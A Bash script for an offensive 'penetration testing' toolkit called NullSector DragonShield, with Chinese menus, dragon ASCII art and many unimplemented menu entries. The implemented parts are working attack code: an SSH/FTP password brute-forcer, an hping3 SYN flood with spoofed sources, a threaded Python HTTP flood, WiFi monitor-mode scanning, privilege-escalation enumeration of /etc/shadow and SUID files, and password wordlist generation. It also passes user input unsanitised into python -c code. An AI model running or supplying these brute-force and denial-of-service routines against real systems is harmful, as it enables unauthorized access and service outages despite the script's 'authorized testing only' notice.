#!/bin/bash

# NullSector DragonShield 主程序
# 版本: 2.0.0
# 作者: NullSector 安全工作室

# 配置路径
CONFIG_DIR="$HOME/.nullsector"
CONFIG_FILE="$CONFIG_DIR/nullsector.conf"
TOOLS_DIR="$CONFIG_DIR/tools"
WORDLISTS_DIR="$CONFIG_DIR/wordlists"
LOG_DIR="$CONFIG_DIR/logs"
RESULTS_DIR="$CONFIG_DIR/results"

# 颜色和样式
BLACK='\033[0;30m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color
BOLD='\033[1m'
UNDERLINE='\033[4m'
BLINK='\033[5m'
REVERSE='\033[7m'

# 加载配置
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source <(grep = "$CONFIG_FILE" | sed 's/ *= */=/g')
    else
        echo -e "${RED}[!] 配置文件不存在，请先运行安装脚本${NC}"
        exit 1
    fi
}

# 炫酷龙形动画
dragon_animation() {
    local frames=(
        "  🐉⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤  "
        "   🔥⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤🔥   "
        "    ⚔️⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⚔️    "
        "     🔥⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤🔥     "
        "      🐉⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤⃟⃤⃯⃤🐉      "
    )
    
    for frame in "${frames[@]}"; do
        echo -e "${RED}${BLINK}$frame${NC}"
        sleep 0.1
        clear
    done
}

# 主标题显示
show_dragon_header() {
    clear
    echo -e "${PURPLE}${BOLD}"
    cat << "EOF"

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀
⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀
⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀
⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀
⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇
⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠉⠀
⠀⠀⠀⠀⠈⠉⠙⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⠉⠉⠉⠁⠀⠀⠀⠀⠀

    龙腾四海 · 盾守八方 · 剑指苍穹 · 火焚九渊
EOF
    echo -e "${NC}"
    
    # 动态火焰效果
    echo -e "${RED}${BLINK}"
    echo "    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░"
    echo "    ░░🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥░░"
    echo "    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░"
    echo -e "${NC}"
    
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║    🐉 ${BOLD}NullSector DragonShield v2.0${NC}${CYAN} - 网络安全终极套件 🛡️   ║${NC}"
    echo -e "${CYAN}║                 守护者：$USER | $(date '+%Y-%m-%d %H:%M:%S')                ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# 动态菜单显示
show_menu() {
    echo -e "${YELLOW}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}│                ${BOLD}🐲 主菜单 - 龙之领域 🐲${NC}${YELLOW}                │${NC}"
    echo -e "${YELLOW}├─────────────────────────────────────────────────────────┤${NC}"
    
    # 第一列：侦察工具
    echo -e "${YELLOW}│  ${BOLD}🔍 侦察与信息收集${NC}${YELLOW}                              │${NC}"
    echo -e "${YELLOW}│   1. 网络扫描器           2. 子域名爆破                │${NC}"
    echo -e "${YELLOW}│   3. 端口扫描             4. WHOIS查询                 │${NC}"
    echo -e "${YELLOW}│   5. DNS侦查              6. 网页技术探测              │${NC}"
    echo -e "${YELLOW}│   7. 邮箱收集器           8. 社交媒体情报             │${NC}"
    
    # 第二列：漏洞扫描
    echo -e "${YELLOW}│  ${BOLD}⚡ 漏洞扫描与利用${NC}${YELLOW}                              │${NC}"
    echo -e "${YELLOW}│   9. Web漏洞扫描         10. SQL注入检测              │${NC}"
    echo -e "${YELLOW}│   11. XSS检测器          12. 命令注入测试             │${NC}"
    echo -e "${YELLOW}│   13. 文件包含检测       14. SSRF检测器               │${NC}"
    echo -e "${YELLOW}│   15. XXE扫描器          16. 反序列化漏洞检测         │${NC}"
    
    # 第三列：密码攻击
    echo -e "${YELLOW}│  ${BOLD}🔐 密码攻击与破解${NC}${YELLOW}                              │${NC}"
    echo -e "${YELLOW}│   17. 暴力破解器         18. 字典攻击                 │${NC}"
    echo -e "${YELLOW}│   19. 密码喷射           20. 哈希破解                 │${NC}"
    echo -e "${YELLOW}│   21. 凭证爆破           22. 密码策略测试             │${NC}"
    echo -e "${YELLOW}│   23. JWT令牌破解        24. API密钥爆破              │${NC}"
    
    # 第四列：网络攻击
    echo -e "${YELLOW}│  ${BOLD}🌐 网络攻击与防护${NC}${YELLOW}                              │${NC}"
    echo -e "${YELLOW}│   25. DOS攻击模拟        26. 中间人攻击               │${NC}"
    echo -e "${YELLOW}│   27. 端口转发           28. 数据包嗅探               │${NC}"
    echo -e "${YELLOW}│   29. SSL/TLS测试        30. 防火墙绕过               │${NC}"
    echo -e "${YELLOW}│   31. 代理链测试         32. 隧道建立                 │${NC}"
    
    # 第五列：无线安全
    echo -e "${YELLOW}│  ${BOLD}📡 无线网络安全${NC}${YELLOW}                                │${NC}"
    echo -e "${YELLOW}│   33. WiFi扫描器         34. 握手包捕获               │${NC}"
    echo -e "${YELLOW}│   35. WPA/WPA2破解       36. 恶意热点检测             │${NC}"
    echo -e "${YELLOW}│   37. 信号强度分析       38. 信道分析                 │${NC}"
    
    # 第六列：后渗透
    echo -e "${YELLOW}│  ${BOLD}🐉 后渗透与持久化${NC}${YELLOW}                              │${NC}"
    echo -e "${YELLOW}│   39. 权限提升检查       40. 后门生成器               │${NC}"
    echo -e "${YELLOW}│   41. 横向移动工具       42. 数据窃取模拟             │${NC}"
    echo -e "${YELLOW}│   43. 痕迹清理           44. 反取证工具               │${NC}"
    
    # 第七列：工具管理
    echo -e "${YELLOW}│  ${BOLD}🛠️ 工具与资源管理${NC}${YELLOW}                              │${NC}"
    echo -e "${YELLOW}│   45. 字典管理器         46. 工具更新器               │${NC}"
    echo -e "${YELLOW}│   47. 报告生成器         48. 日志查看器               │${NC}"
    echo -e "${YELLOW}│   49. 系统状态           50. 网络监控                 │${NC}"
    echo -e "${YELLOW}│   51. 设置               52. 帮助                     │${NC}"
    
    echo -e "${YELLOW}├─────────────────────────────────────────────────────────┤${NC}"
    echo -e "${YELLOW}│   99. 退出               0. 显示龙纹                  │${NC}"
    echo -e "${YELLOW}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# 工具1：网络扫描器
network_scanner() {
    echo -e "${CYAN}[*] 启动网络扫描器...${NC}"
    echo -e "${YELLOW}选择扫描类型:${NC}"
    echo "1) 快速扫描"
    echo "2) 全面扫描"
    echo "3) 隐蔽扫描"
    echo "4) UDP扫描"
    echo "5) 操作系统识别"
    
    read -p "选择: " scan_type
    
    read -p "输入目标IP或域名: " target
    read -p "输入端口范围(默认1-1000): " ports
    ports=${ports:-"1-1000"}
    
    echo -e "${GREEN}[+] 开始扫描 $target ...${NC}"
    
    case $scan_type in
        1) nmap -T4 -F $target ;;
        2) nmap -T4 -A -p $ports $target ;;
        3) nmap -T2 -f -p $ports $target ;;
        4) nmap -sU -p $ports $target ;;
        5) nmap -O $target ;;
        *) echo "无效选择" ;;
    esac
    
    echo -e "${GREEN}[+] 扫描完成${NC}"
}

# 工具2：子域名爆破
subdomain_brute() {
    echo -e "${CYAN}[*] 启动子域名爆破...${NC}"
    read -p "输入域名: " domain
    read -p "使用线程数(默认10): " threads
    threads=${threads:-10}
    
    echo -e "${YELLOW}[!] 开始爆破子域名...${NC}"
    
    # 使用多种方法爆破
    if [ -f "$WORDLISTS_DIR/subdomains.txt" ]; then
        echo -e "${GREEN}[+] 使用字典爆破...${NC}"
        while read sub; do
            host="$sub.$domain"
            if host "$host" &>/dev/null; then
                echo -e "${GREEN}[+] 发现: $host${NC}"
            fi
        done < "$WORDLISTS_DIR/subdomains.txt" &
    fi
    
    # 使用API查询
    echo -e "${GREEN}[+] 查询证书透明度日志...${NC}"
    curl -s "https://crt.sh/?q=%.$domain&output=json" | jq -r '.[].name_value' | sort -u
    
    wait
    echo -e "${GREEN}[+] 爆破完成${NC}"
}

# 工具17：暴力破解器
brute_force() {
    echo -e "${CYAN}[*] 启动暴力破解器...${NC}"
    echo -e "${YELLOW}选择破解类型:${NC}"
    echo "1) SSH破解"
    echo "2) FTP破解"
    echo "3) HTTP基本认证"
    echo "4) WordPress"
    echo "5) 自定义"
    
    read -p "选择: " brute_type
    read -p "输入目标: " target
    read -p "输入用户名(或用户名字典路径): " username
    read -p "输入密码字典路径: " pass_file
    
    if [ ! -f "$pass_file" ]; then
        pass_file="$WORDLISTS_DIR/passwords.txt"
    fi
    
    echo -e "${RED}[!] 开始暴力破解...${NC}"
    
    case $brute_type in
        1)
            # SSH破解
            while read pass; do
                echo "尝试: $username:$pass"
                sshpass -p "$pass" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$username@$target" "exit" 2>/dev/null
                if [ $? -eq 0 ]; then
                    echo -e "${GREEN}[+] 成功! 密码: $pass${NC}"
                    break
                fi
            done < "$pass_file"
            ;;
        2)
            # FTP破解
            while read pass; do
                echo "尝试: $username:$pass"
                ftp -n $target << EOF
user $username $pass
quit
EOF
                if [ $? -eq 0 ]; then
                    echo -e "${GREEN}[+] 成功! 密码: $pass${NC}"
                    break
                fi
            done < "$pass_file"
            ;;
        *)
            echo "功能开发中..."
            ;;
    esac
}

# 工具25：DOS攻击模拟
dos_simulation() {
    echo -e "${RED}[!] 警告: 此工具仅用于教育目的!${NC}"
    read -p "确认继续? (y/N): " confirm
    if [[ ! $confirm =~ ^[Yy]$ ]]; then
        return
    fi
    
    echo -e "${CYAN}[*] 启动DOS攻击模拟...${NC}"
    echo -e "${YELLOW}选择攻击类型:${NC}"
    echo "1) SYN Flood"
    echo "2) HTTP Flood"
    echo "3) Slowloris"
    echo "4) UDP Flood"
    
    read -p "选择: " attack_type
    read -p "输入目标IP: " target
    read -p "输入目标端口: " port
    read -p "持续时间(秒): " duration
    
    echo -e "${RED}[!] 开始攻击模拟...${NC}"
    
    case $attack_type in
        1)
            # SYN Flood模拟
            timeout $duration hping3 --syn --flood --rand-source $target -p $port
            ;;
        2)
            # HTTP Flood
            timeout $duration python3 -c "
import socket
import time
import threading

target = '$target'
port = $port

def http_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b'GET / HTTP/1.1\r\nHost: $target\r\n\r\n')
            s.close()
        except:
            pass

for i in range(100):
    threading.Thread(target=http_flood).start()
time.sleep($duration)
"
            ;;
        *)
            echo "攻击模拟完成"
            ;;
    esac
    
    echo -e "${YELLOW}[!] 攻击模拟结束${NC}"
}

# 工具33：WiFi扫描器
wifi_scanner() {
    echo -e "${CYAN}[*] 启动WiFi扫描器...${NC}"
    
    # 检查权限
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[!] 需要root权限${NC}"
        return
    fi
    
    # 检查无线网卡
    if ! iwconfig 2>/dev/null | grep -q "IEEE"; then
        echo -e "${RED}[!] 未找到无线网卡${NC}"
        return
    fi
    
    echo -e "${GREEN}[+] 开始扫描WiFi网络...${NC}"
    
    # 使用aircrack-ng套件
    if command -v airodump-ng &> /dev/null; then
        read -p "输入无线网卡接口(默认wlan0): " interface
        interface=${interface:-"wlan0"}
        
        # 设置为监控模式
        airmon-ng check kill
        airmon-ng start $interface
        
        # 扫描网络
        timeout 10 airodump-ng ${interface}mon
        
        # 恢复模式
        airmon-ng stop ${interface}mon
        systemctl restart NetworkManager
    else
        echo -e "${YELLOW}[!] 安装aircrack-ng: sudo apt install aircrack-ng${NC}"
    fi
}

# 工具39：权限提升检查
privesc_check() {
    echo -e "${CYAN}[*] 启动权限提升检查...${NC}"
    
    echo -e "${GREEN}[+] 检查系统信息...${NC}"
    echo "===================[系统信息]==================="
    uname -a
    cat /etc/os-release
    echo ""
    
    echo -e "${GREEN}[+] 检查用户权限...${NC}"
    echo "===================[用户信息]==================="
    whoami
    id
    sudo -l
    echo ""
    
    echo -e "${GREEN}[+] 检查SUID文件...${NC}"
    echo "===================[SUID文件]==================="
    find / -perm -4000 -type f 2>/dev/null | head -20
    echo ""
    
    echo -e "${GREEN}[+] 检查计划任务...${NC}"
    echo "===================[计划任务]==================="
    crontab -l
    ls -la /etc/cron* 2>/dev/null
    echo ""
    
    echo -e "${GREEN}[+] 检查网络信息...${NC}"
    echo "===================[网络信息]==================="
    ip a
    netstat -antp
    echo ""
    
    echo -e "${GREEN}[+] 检查敏感文件权限...${NC}"
    echo "===================[文件权限]==================="
    ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
    echo ""
    
    echo -e "${YELLOW}[!] 检查完成，请查看以上输出寻找提权机会${NC}"
}

# 工具45：字典管理器
wordlist_manager() {
    echo -e "${CYAN}[*] 启动字典管理器...${NC}"
    
    while true; do
        echo -e "${YELLOW}┌─────────────────────────────────────────┐${NC}"
        echo -e "${YELLOW}│             字典管理器                  │${NC}"
        echo -e "${YELLOW}├─────────────────────────────────────────┤${NC}"
        echo "1) 查看所有字典"
        echo "2) 下载新字典"
        echo "3) 生成自定义字典"
        echo "4) 合并字典"
        echo "5) 字典统计"
        echo "6) 清理重复项"
        echo "7) 返回主菜单"
        echo -e "${YELLOW}└─────────────────────────────────────────┘${NC}"
        
        read -p "选择: " choice
        
        case $choice in
            1)
                echo -e "${GREEN}[+] 可用字典:${NC}"
                ls -lh "$WORDLISTS_DIR/" | grep -v "^total"
                ;;
            2)
                echo -e "${GREEN}[+] 下载字典...${NC}"
                echo "1) RockYou字典"
                echo "2) SecLists全套"
                echo "3) 中文常用密码"
                echo "4) 自定义URL"
                
                read -p "选择: " dict_choice
                case $dict_choice in
                    1)
                        wget -O "$WORDLISTS_DIR/rockyou.txt" \
                            "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
                        ;;
                    2)
                        git clone --depth 1 https://github.com/danielmiessler/SecLists.git \
                            "$WORDLISTS_DIR/SecLists"
                        ;;
                    3)
                        # 生成中文密码字典
                        python3 -c "
common_words = ['123456', 'password', 'admin', 'qwerty', '111111', '123123']
chinese_words = ['我爱你', '中国', '北京', '上海', '深圳', '腾讯', '阿里巴巴']
with open('$WORDLISTS_DIR/chinese_pass.txt', 'w') as f:
    for word in common_words + chinese_words:
        f.write(word + '\n')
        f.write(word + '123\n')
        f.write(word + '!\n')
        f.write(word + '@\n')
print('生成完成')
"
                        ;;
                    4)
                        read -p "输入字典URL: " dict_url
                        read -p "输入保存名称: " dict_name
                        wget -O "$WORDLISTS_DIR/$dict_name" "$dict_url"
                        ;;
                esac
                ;;
            3)
                read -p "输入基础单词(用空格分隔): " base_words
                read -p "输入输出文件名: " output_file
                
                python3 -c "
import itertools
base_words = '$base_words'.split()
output = []
for word in base_words:
    output.append(word)
    output.append(word + '123')
    output.append(word + '!')
    output.append(word + '@')
    output.append(word + '123!')
    output.append(word.upper())
    output.append(word.title())
    
# 组合
for i in range(len(base_words)):
    for j in range(i+1, len(base_words)):
        output.append(base_words[i] + base_words[j])
        output.append(base_words[i] + '_' + base_words[j])

with open('$WORDLISTS_DIR/$output_file', 'w') as f:
    for item in set(output):
        f.write(item + '\n')
print(f'生成 {len(set(output))} 个密码')
"
                ;;
            7) break ;;
            *) echo "无效选择" ;;
        esac
    done
}

# 工具51：设置
settings_menu() {
    while true; do
        echo -e "${CYAN}┌─────────────────────────────────────────┐${NC}"
        echo -e "${CYAN}│                设置                      │${NC}"
        echo -e "${CYAN}├─────────────────────────────────────────┤${NC}"
        echo "1) 查看当前配置"
        echo "2) 修改颜色主题"
        echo "3) 更新工具"
        echo "4) 备份配置"
        echo "5) 恢复配置"
        echo "6) 查看日志"
        echo "7) 清理缓存"
        echo "8) 返回主菜单"
        echo -e "${CYAN}└─────────────────────────────────────────┘${NC}"
        
        read -p "选择: " choice
        
        case $choice in
            1)
                echo -e "${GREEN}[+] 当前配置:${NC}"
                cat "$CONFIG_FILE" | grep -v "^#" | sed 's/=/ = /'
                ;;
            2)
                echo -e "${YELLOW}选择颜色主题:${NC}"
                echo "1) 龙之红黑"
                echo "2) 深海之蓝"
                echo "3) 森林之绿"
                echo "4) 暗夜紫光"
                read -p "选择: " theme
                
                case $theme in
                    1) sed -i 's/color_scheme=.*/color_scheme=dragon/' "$CONFIG_FILE" ;;
                    2) sed -i 's/color_scheme=.*/color_scheme=ocean/' "$CONFIG_FILE" ;;
                    3) sed -i 's/color_scheme=.*/color_scheme=forest/' "$CONFIG_FILE" ;;
                    4) sed -i 's/color_scheme=.*/color_scheme=purple/' "$CONFIG_FILE" ;;
                esac
                echo -e "${GREEN}[+] 主题已更新，重启生效${NC}"
                ;;
            3)
                echo -e "${CYAN}[*] 检查更新...${NC}"
                cd "$CONFIG_DIR"
                git pull 2>/dev/null || echo "使用git pull更新"
                ;;
            6)
                echo -e "${GREEN}[+] 最近日志:${NC}"
                tail -20 "$LOG_DIR/dragonshield.log" 2>/dev/null || echo "暂无日志"
                ;;
            8) break ;;
            *) echo "无效选择" ;;
        esac
    done
}

# 龙纹显示
show_dragon_pattern() {
    echo -e "${RED}"
    cat << "EOF"

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀
⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⠿⠿⠿⠿⠟⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀

                龙纹显现 · 神力加持
EOF
    echo -e "${NC}"
    
    # 动态效果
    for i in {1..3}; do
        echo -e "${RED}${BLINK}🔥 龙息喷涌 · 守护激活 🔥${NC}"
        sleep 0.3
        echo -e "${YELLOW}${BLINK}⚡ 雷电交织 · 力量觉醒 ⚡${NC}"
        sleep 0.3
        echo -e "${CYAN}${BLINK}❄️ 冰霜凝结 · 绝对防御 ❄️${NC}"
        sleep 0.3
    done
    echo ""
}

# 帮助信息
show_help() {
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                    DragonShield 帮助                     ║${NC}"
    echo -e "${CYAN}╠══════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║ 使用方法: dragonshield [选项]                            ║${NC}"
    echo -e "${CYAN}║                                                          ║${NC}"
    echo -e "${CYAN}║ 选项:                                                    ║${NC}"
    echo -e "${CYAN}║   --scan <目标>     快速网络扫描                         ║${NC}"
    echo -e "${CYAN}║   --brute <目标>    暴力破解攻击                         ║${NC}"
    echo -e "${CYAN}║   --dos <目标>      DOS攻击模拟                         ║${NC}"
    echo -e "${CYAN}║   --wifi            WiFi安全扫描                         ║${NC}"
    echo -e "${CYAN}║   --privesc         权限提升检查                         ║${NC}"
    echo -e "${CYAN}║   --update          更新工具                             ║${NC}"
    echo -e "${CYAN}║   --help            显示此帮助                           ║${NC}"
    echo -e "${CYAN}║   --version         显示版本信息                         ║${NC}"
    echo -e "${CYAN}║                                                          ║${NC}"
    echo -e "${CYAN}║ 示例:                                                    ║${NC}"
    echo -e "${CYAN}║   dragonshield --scan 192.168.1.1                        ║${NC}"
    echo -e "${CYAN}║   dragonshield --brute example.com                       ║${NC}"
    echo -e "${CYAN}║   dragonshield                                          ║${NC}"
    echo -e "${CYAN}║                                                          ║${NC}"
    echo -e "${CYAN}║ 注意: 仅用于授权测试！遵守法律法规！                     ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════╝${NC}"
}

# 命令行参数处理
handle_args() {
    case $1 in
        --scan)
            show_dragon_header
            network_scanner
            exit 0
            ;;
        --brute)
            show_dragon_header
            brute_force
            exit 0
            ;;
        --dos)
            show_dragon_header
            dos_simulation
            exit 0
            ;;
        --wifi)
            show_dragon_header
            wifi_scanner
            exit 0
            ;;
        --privesc)
            show_dragon_header
            privesc_check
            exit 0
            ;;
        --update)
            echo -e "${CYAN}[*] 更新DragonShield...${NC}"
            cd "$CONFIG_DIR" && git pull
            exit 0
            ;;
        --help)
            show_dragon_header
            show_help
            exit 0
            ;;
        --version)
            echo "DragonShield v2.0.0 - NullSector Security"
            exit 0
            ;;
        *)
            # 如果没有参数，进入交互模式
            return
            ;;
    esac
}

# 主函数
main() {
    # 加载配置
    load_config
    
    # 处理命令行参数
    if [ $# -gt 0 ]; then
        handle_args "$@"
    fi
    
    # 显示龙纹动画
    dragon_animation
    
    # 主循环
    while true; do
        show_dragon_header
        show_menu
        
        read -p "🐉 选择工具编号: " choice
        
        case $choice in
            1) network_scanner ;;
            2) subdomain_brute ;;
            3) 
                read -p "输入目标: " target
                nmap -p- $target 
                ;;
            4)
                read -p "输入域名: " domain
                whois $domain
                ;;
            5)
                read -p "输入域名: " domain
                dig any $domain
                ;;
            17) brute_force ;;
            25) dos_simulation ;;
            33) wifi_scanner ;;
            39) privesc_check ;;
            45) wordlist_manager ;;
            51) settings_menu ;;
            52) show_help ;;
            0) show_dragon_pattern ;;
            99)
                echo -e "${RED}🔥 龙盾关闭 · 安全撤离 🔥${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] 无效选择，请重试${NC}"
                sleep 1
                ;;
        esac
        
        echo ""
        read -p "按Enter键继续..." </dev/tty
    done
}

# 启动主函数
main "$@"